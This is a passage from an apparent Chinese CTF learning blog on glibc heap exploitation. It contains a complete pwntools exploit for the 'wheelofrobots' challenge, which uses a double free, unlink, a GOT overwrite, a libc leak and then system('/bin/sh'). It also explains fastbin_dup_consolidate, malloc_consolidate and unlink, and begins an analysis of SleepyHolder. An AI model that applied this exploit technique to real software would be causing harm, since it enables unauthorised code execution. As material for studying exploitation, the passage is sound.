1</span></span><br><span class="line">add(<span class="number">6</span>,powerful=<span class="number">0x20</span>)<span class="comment">#Add Destructor small chunk     			  	2</span></span><br><span class="line">delete(<span class="number">3</span>)<span class="comment">#trigger unlink			 				1</span></span><br></pre></td></tr></table></figure>

<p>这里再trigger之前为什么要delete Bender还有add Destructor主要是为了后面的利用，这一块是我在写后面利用的时候回来补的(主要是delete3之后再来delete的时候会报错)，可以先不用管，这里delete Bender到fastbins里面之后也并没有影响fake_chunk，其prev_size字段本来就是0</p>
<p>因为我们之前add了Chain_smoker，所以可以用这个Chain_smoker_ptr来修改GOT表，具体为先修改Chain_smoker_ptr为&amp;free_GOT，然后change为&amp;puts_plt，再将Chain_smoker_ptr设置成puts_GOT，从而delete Chain_smoker时可以调用puts(&amp;puts_GOT)，计算出libc偏移</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">overflow_Bender_to(<span class="number">1</span>)</span><br><span class="line">free_GOT=<span class="number">0x603018</span></span><br><span class="line">puts_plt=<span class="number">0x400830</span></span><br><span class="line">puts_GOT=<span class="number">0x603028</span></span><br><span class="line">change(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(free_GOT))<span class="comment">#change Chain_smoker_ptr to &amp;free_GOT by Bender</span></span><br><span class="line">change(<span class="number">4</span>,p64(puts_plt))<span class="comment">#*free_GOT to &amp;puts_plt by Chain_smoker_ptr</span></span><br><span class="line">change(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(puts_GOT))<span class="comment">#change Chain_smoker_ptr to &amp;puts_GOT</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)<span class="comment">#puts(&amp;puts_GOT)							0</span></span><br></pre></td></tr></table></figure>



<p>这个时候我发现，delete Chain_smoker之后，由于<code>Chain_smoker</code>记录会变成0，也就是说通过这个指针来实现Arbitrary write不行了（Bender可以重复利用是因为存在一个溢出），但是这里还有一个<code>Destructor_ptr</code>，所以就有了前面delete Bender然后add Destructor的操作，利用<code>Chain_smoker_ptr</code>实现地址泄露之后，再用<code>Destructor_ptr</code>来实现getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">libc_base=my_u64(p.recv(<span class="number">6</span>))<span class="number">-0x6f690</span></span><br><span class="line">system_address=libc_base+<span class="number">0x45390</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(free_GOT))<span class="comment">#change Destructor_ptr to &amp;free_GOT by Bender</span></span><br><span class="line">change(<span class="number">6</span>,p64(system_address))<span class="comment">#*free_GOT to system_address by Destructor_ptr</span></span><br><span class="line">change(<span class="number">2</span>,<span class="string">'/bin/sh\x00'</span>)<span class="comment"># *Bender_ptr = '/bin/sh\x00'</span></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#system(Bender_ptr)-&gt;system("/bin/sh")</span></span><br></pre></td></tr></table></figure>

<h2 id="完整EXP-1"><a href="#完整EXP-1" class="headerlink" title="完整EXP"></a>完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'wheelofrobots'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span> , stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="comment">#log.info("\033[1;36m" + hex(bin_addr) + "\033[0m")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overflow_Bender_to</span><span class="params">(num)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">	p.send(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	p.send(<span class="string">'9999'</span>+str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(choice,intelligence=<span class="number">0</span>,cruelty=<span class="number">0</span>,powerful=<span class="number">0</span>)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">	p.send(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	p.send(str(choice))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> choice == <span class="number">2</span>:</span><br><span class="line">		p.recvuntil(<span class="string">'intelligence: '</span>)</span><br><span class="line">		p.send(str(intelligence))</span><br><span class="line">	<span class="keyword">elif</span> choice == <span class="number">3</span>:</span><br><span class="line">		p.recvuntil(<span class="string">'cruelty: '</span>)</span><br><span class="line">		p.send(str(cruelty))</span><br><span class="line">	<span class="keyword">elif</span> choice == <span class="number">6</span>:</span><br><span class="line">		p.recvuntil(<span class="string">'powerful: '</span>)</span><br><span class="line">		p.send(str(powerful))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(choice)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">	p.send(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	p.send(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(choice,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">	p.send(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	p.send(str(choice))</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">"Robot's name: "</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,intelligence=<span class="number">2</span>)<span class="comment">#Add Bender						1</span></span><br><span class="line">add(<span class="number">3</span>,cruelty=<span class="number">0x20</span>)<span class="comment">#Add Robot Devil	small chunk				2</span></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#Add Bender to fastbins						1</span></span><br><span class="line">add(<span class="number">4</span>)<span class="comment">#Add large chunk(Chain_smoker) trigger malloc_consolidate	2</span></span><br><span class="line">overflow_Bender_to(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#Delete Bender again							1</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + <span class="string">'Double freed now'</span> + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line">Bender_ptr=<span class="number">0x6030F0</span></span><br><span class="line">add(<span class="number">2</span>,intelligence=<span class="number">2</span>)<span class="comment">#Add Bender 						2</span></span><br><span class="line">fake_chunk  = p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)<span class="comment">#fake chunk head</span></span><br><span class="line">fake_chunk += p64(Bender_ptr<span class="number">-0x18</span>)+p64(Bender_ptr<span class="number">-0x10</span>)<span class="comment">#fake fd/bk</span></span><br><span class="line">fake_chunk += <span class="string">'\x00'</span>*(<span class="number">0x20</span>-len(fake_chunk))</span><br><span class="line">fake_chunk += p64(<span class="number">0x20</span>)<span class="comment">#fake prev_size</span></span><br><span class="line">change(<span class="number">2</span>,fake_chunk)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x4012C0')</span></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#Delete Bender_ptr							1</span></span><br><span class="line">add(<span class="number">6</span>,powerful=<span class="number">0x20</span>)<span class="comment">#Add Destructor small chunk     				2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)<span class="comment">#				 					1</span></span><br><span class="line"></span><br><span class="line">overflow_Bender_to(<span class="number">1</span>)</span><br><span class="line">free_GOT=<span class="number">0x603018</span></span><br><span class="line">puts_plt=<span class="number">0x400830</span></span><br><span class="line">puts_GOT=<span class="number">0x603028</span></span><br><span class="line">change(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(free_GOT))<span class="comment">#change Chain_smoker_ptr to &amp;free_GOT by Bender</span></span><br><span class="line">change(<span class="number">4</span>,p64(puts_plt))<span class="comment">#*free_GOT-&gt;puts_plt by Chain_smoker</span></span><br><span class="line">change(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(puts_GOT))<span class="comment">#change Chain_smoker_ptr to &amp;puts_GOT</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)<span class="comment">#puts(&amp;puts_GOT)							0	</span></span><br><span class="line"></span><br><span class="line">libc_base=my_u64(p.recv(<span class="number">6</span>))<span class="number">-0x6f690</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + <span class="string">'libc_base'</span>+hex(libc_base) + <span class="string">"\033[0m"</span>)</span><br><span class="line">system_address=libc_base+<span class="number">0x45390</span></span><br><span class="line">change(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(free_GOT))<span class="comment">#change Destructor_ptr to &amp;free_GOT by Bender</span></span><br><span class="line">change(<span class="number">6</span>,p64(system_address))<span class="comment">#*free_GOT to system_address by Destructor_ptr</span></span><br><span class="line">change(<span class="number">2</span>,<span class="string">'/bin/sh\x00'</span>)<span class="comment"># *Bender_ptr = '/bin/sh\x00'</span></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#system(Bender_ptr)-&gt;system("/bin/sh")</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/31/how2heap-fastbin-dup-consolidate-SleepyHolder/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Coldshield">
      <meta itemprop="description" content="分享一些bin学习日常的菜鸡">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Coldshield's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/01/31/how2heap-fastbin-dup-consolidate-SleepyHolder/" class="post-title-link" itemprop="url">how2heap - fastbin_dup_consolidate&SleepyHolder</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-01-31 23:30:16" itemprop="dateCreated datePublished" datetime="2020-01-31T23:30:16+08:00">2020-01-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-02-29 18:07:31" itemprop="dateModified" datetime="2020-02-29T18:07:31+08:00">2020-02-29</time>
              </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="fa fa-comment-o"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2020/01/31/how2heap-fastbin-dup-consolidate-SleepyHolder/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/01/31/how2heap-fastbin-dup-consolidate-SleepyHolder/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="how2heap-fastbin-dup-consolidate-amp-SleepyHolder"><a href="#how2heap-fastbin-dup-consolidate-amp-SleepyHolder" class="headerlink" title="how2heap - fastbin_dup_consolidate&amp;SleepyHolder"></a>how2heap - fastbin_dup_consolidate&amp;SleepyHolder</h1><h1 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h1><p>写这个题之前先学习了很多前置知识，简略的写一下</p>
<p>how2heap上的 fastbin_dup_consolidate.c：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated two fastbins: p1=%p p2=%p\n"</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now free p1!\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated large bin to trigger malloc_consolidate(): p3=%p\n"</span>, p3);<span class="comment">//Here</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In malloc_consolidate(), p1 is moved to the unsorted bin.\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Trigger the double free vulnerability!\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We can pass the check in malloc() since p1 is not fast top.\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看这段源码时有一段话：<em>Allocated large bin to trigger malloc_consolidate()</em>，暂时不懂这个是什么所以查阅了很多资料</p>
<h2 id="malloc-consolidate："><a href="#malloc-consolidate：" class="headerlink" title="malloc_consolidate："></a><strong>malloc_consolidate：</strong></h2><p>​        对于malloc_consolidate函数，<code>malloc_consolidate()</code> 是 <code>free()</code> 的一个小的变体，专门用于<strong>处理 fastbin 中的空闲 chunk</strong>。同时还负责<strong>堆管理的初始化工作</strong></p>
<p><strong>未初始化：</strong></p>
<p>​        进入 <code>malloc_consolidate()</code> ，首先通过  <code>get_max_fast()</code> 判断当前堆是否已经初始化。当进程第一次调用 <code>malloc()</code> 申请分配的时候，<code>get_max_fast()</code> 返回值等于 0，此时会进行堆的初始化工作</p>
<p>​        在 <code>malloc_init_state()</code> 里会进行堆的初始化工作，并且会调用<code>set_max_fast()</code> 设置 <code>global_max_fast</code> 为 DEFAULT_MXFAST ，DEFAULT_MXFAST 在 32 位系统上为 64，在 64 位系统上为 128。因而在以后进入 <code>malloc_consolidate()</code> 的时候 <code>get_max_fast()</code> 返回值都不会等于 0，保证不会重复进行堆的初始化工作</p>
<p><strong>已初始化：</strong></p>
<p>​        如果 <code>get_max_fast()</code> 返回值不等于 0，说明堆已经初始化，接下来就将 fastbin 中的每一个 chunk 合并整理到 unsorted_bin 或 top_chunk。</p>
<p>​        其中对每一个 chunk，首先尝试向后合并，然后调用 <code>unlink()</code> 宏将后方 chunk 从其链接的 bin 中脱链（<em>然后看到这里又去查阅了很多向前合并和向后合并的知识，具体见下文</em>）</p>
<ol>
<li>若 <code>get_max_fast()</code> 返回 0，则进行堆的初始化工作，然后进入第 7 步</li>
<li>从 fastbin 中获取一个空闲 chunk</li>
<li>尝试向后合并</li>
<li>尝试向前合并，若向前相邻 top_chunk，则直接合并到 top_chunk，然后进入第 6 步</li>
<li>否则向前合并后，插入到 unsorted_bin 中</li>
<li>获取下一个空闲 chunk，回到第 2 步，直到所有 fastbin 清空后进入第 7 步</li>
<li>退出函数</li>
</ol>
<p>原文链接：<a href="https://blog.csdn.net/plus_re/article/details/79265805" target="_blank" rel="noopener">https://blog.csdn.net/plus_re/article/details/79265805</a></p>
<h2 id="向后合并："><a href="#向后合并：" class="headerlink" title="向后合并："></a><strong>向后合并：</strong></h2><ul>
<li>检查p指向chunk的size字段的pre_inuse位，是否为0（也就是检查当前chunk的前一块chunk是否是free的，如果是则进入向前合并的流程)</li>
<li>获取前一块chunk的size，并加到size中（以此来表示size大小上已经合并）</li>
<li>根据当前chunk的presize来获得指向前一块chunk的指针</li>
<li>将这个指针传入unlink的宏（也就是让free掉的chunk的前一块chunk进入到unlink流程）</li>
</ul>
<h2 id="向前合并："><a href="#向前合并：" class="headerlink" title="向前合并："></a><strong>向前合并：</strong></h2><p>如果free掉的chunk相邻的下一块chunk (下面用nextchunk表示，并且nextsize表示它的大小) 不是topchunk,并且是free的话就进入向前合并的流程。</p>
<p>如果nextchunk不是free的，则修改他的size字段的pre_inuse位。<br>如果nextchunk是topchunk则和topchunk进行合并。</p>
<p>ps:检测nextchunk是否free，是通过 <code>inuse_bit_at_offset(nextchunk, nextsize)</code> 来<strong>获得nextchunk的相邻下一块chunk的size字段的presize位实现的</strong>。</p>
<p>向前合并流程：</p>
<ul>
<li>让nextchunk进入unlink流程</li>
<li>给size加上nextsize（同理也是表示大小上两个chunk已经合并了）</li>
</ul>
<p>原文链接：<a href="https://bbs.ichunqiu.com/thread-46614-1-1.html?from=bkyl" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-46614-1-1.html?from=bkyl</a></p>
<p>接着又学到了<code>unlink()</code>的一些东西</p>
<h2 id="unlink："><a href="#unlink：" class="headerlink" title="unlink："></a><strong>unlink：</strong></h2><p>把源码一拖稍微缕了缕，大致如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">unlink(AV, P, BK, FD)<span class="comment">//P是指向本chunk的指针</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))</span><br><span class="line">		malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);</span><br><span class="line">    <span class="comment">//检查本chunk的size和next chunk的prev_size段是否相等，排除了fast chunk</span></span><br><span class="line"></span><br><span class="line">	FD = P-&gt;fd;<span class="comment">//P+0x10</span></span><br><span class="line">	BK = P-&gt;bk;<span class="comment">//P+0x18 FD和BK分别指向forward chunk和back chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">    	malloc_printerr (<span class="string">"corrupted double-linked list"</span>);</span><br><span class="line">    <span class="comment">//检查前chunk的bk和后chunk的fd是否与P相等</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		FD-&gt;bk = BK;</span><br><span class="line">		BK-&gt;fd = FD;<span class="comment">//链表的卸下操作</span></span><br><span class="line">        </span><br><span class="line">        	<span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))&amp;&amp;</span><br><span class="line">         	   __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>))<span class="comment">//当链表为large bin且fd_nextsize不为空</span></span><br><span class="line">        	&#123;</span><br><span class="line">			<span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)</span><br><span class="line">				|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))</span><br><span class="line">				malloc_printerr (<span class="string">"corrupted double-linked list (not small)"</span>);</span><br><span class="line">                		<span class="comment">//检查前chunk的bk_nextsize和后chunk的fd_nextsize是否与P相等</span></span><br><span class="line">            </span><br><span class="line">			<span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (P-&gt;fd_nextsize == P)	FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">				   FD-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">                		   FD-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">                		   P-&gt;fd_nextsize-&gt;bk_nextsize = FD;</span><br><span class="line">                		   P-&gt;bk_nextsize-&gt;fd_nextsize = FD;</span><br><span class="line">				&#125;                                                              </span><br><span class="line">            		&#125;</span><br><span class="line">           	 <span class="keyword">else</span>&#123;</span><br><span class="line">            	 	P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">			P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;&#125;                                                                                         </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这其中对于large chunk中<code>fd_nextsize</code>还有<code>bk_nextsize</code>的一些利用解释起来有点多</p>
<p>给个链接自己以后方便查阅吧：<a href="https://blog.csdn.net/Plus_RE/article/details/79270350" target="_blank" rel="noopener">https://blog.csdn.net/Plus_RE/article/details/79270350</a></p>
<h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p>接下来自己debug一下fastbin_dup_consolidate.c</p>
<p><strong>free掉p1之后：</strong></p>
<img src="/2020/01/31/how2heap-fastbin-dup-consolidate-SleepyHolder/1580374267214.png" width="60%" height="60%">

<p>然后malloc一个large chunk触发<code>malloc_consolidate()</code>，我这里和how2heap上不同的是这个fast chunk被放入了<code>smallbins</code>而不是<code>unsortedbin</code>，不过好像对于double free的利用暂无大碍（此处待深入）</p>
<img src="/2020/01/31/how2heap-fastbin-dup-consolidate-SleepyHolder/1580375108795.png" width="60%" height="60%">

<p>再次调用<code>free(p1)</code></p>
<img src="/2020/01/31/how2heap-fastbin-dup-consolidate-SleepyHolder/1580375318508.png" width="60%" height="60%">

<p>此时在fastbins还有smallbins中都存在这个chunk，从而在<code>malloc(0x40)</code>两次时double free的利用被触发，先取fastbin、再取smallbin</p>
<h1 id="SleepyHolder"><a href="#SleepyHolder" class="headerlink" title="SleepyHolder"></a>SleepyHolder</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><img src="/2020/01/31/how2heap-fastbin-dup-consolidate-SleepyHolder/1580375767478.png" width="70%" height="70%">

<p>一上来先malloc了一个size随机的chunk，然后进入正常的菜单</p>
<h3 id="Keep"><a href="#Keep" class="headerlink" title="Keep"></a>Keep</h3><img src="/2020/01/31/how2heap-fastbin-dup-consolidate-SleepyHolder/1580375954105.png" width="60%" height="60%">

<p>选择一个固定大小的small、big、huge大小的secret，然后calloc，对应的每个secret只能calloc一次，然后把ptr存在bss段上，通过记录来实现无法多次calloc</p>
<img src="/2020/01/31/how2heap-fastbin-dup-consolidate-SleepyHolder/1580377392403.png" width="80%" height="80%">

<h3 id="Wipe"><a href="#Wipe" class="headerlink" title="Wipe"></a>Wipe</h3><img src="/2020/01/31/how2heap-fastbin-dup-consolidate-SleepyHolder/1580384309728.png" width="50%" height="50%">

<p>选择small、big secret来free（没有huge），并清除记录，没有清除ptr，也没有检查是using or not</p>
<h3 id="Renew"><a href="#Renew" class="headerlink" title="Renew"></a>Renew</h3><img src="/2020/01/31/how2heap-fastbin-dup-consolidate-SleepyHolder/1580384570255.png" width="50%" height="50%">

<p>选择small、big secret，检查标记后通过read renew</p>
